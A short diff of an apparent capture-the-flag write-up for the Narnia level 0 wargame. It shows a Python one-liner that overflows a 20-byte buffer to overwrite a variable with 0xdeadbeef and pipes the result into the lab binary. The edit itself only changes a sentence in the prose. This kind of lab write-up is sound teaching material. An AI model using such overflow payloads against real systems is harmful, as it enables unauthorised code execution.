@@ -19,7 +19,7 @@ Correct val's value from 0x41414141 -> 0xdeadbeef!
 Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAï¾­Þ
 val: 0xdeadbeef
 ```
-Damn!!! I successfully overwrite the val varible with “0xdeadbeef” but I was not given a shell, this is because the shell closes straight away.
+DI successfully overwrite the val varible with “0xdeadbeef” but I was not given a shell, this is because the shell closes straight away.
 
 ```
 narnia0@melinda:~$ python -c'print "A"*20 + "\xef\xbe\xad\xde"';id | /narnia/narnia0
